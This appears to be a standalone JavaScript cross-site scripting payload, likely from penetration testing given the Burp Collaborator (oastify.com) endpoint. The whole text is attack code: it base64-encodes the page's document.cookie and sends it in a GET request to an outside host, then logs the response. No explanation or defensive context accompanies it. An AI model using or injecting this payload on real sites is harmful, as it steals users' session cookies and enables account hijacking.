var xhr = new XMLHttpRequest();
var deneme = btoa(document.cookie);
xhr.open("GET", "https://vqp7jy3cdbne3zzhbbn0iy4nfel591xq.oastify.com?test="+deneme, true);
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
        console.log(xhr.responseText);
    }
};
xhr.send();
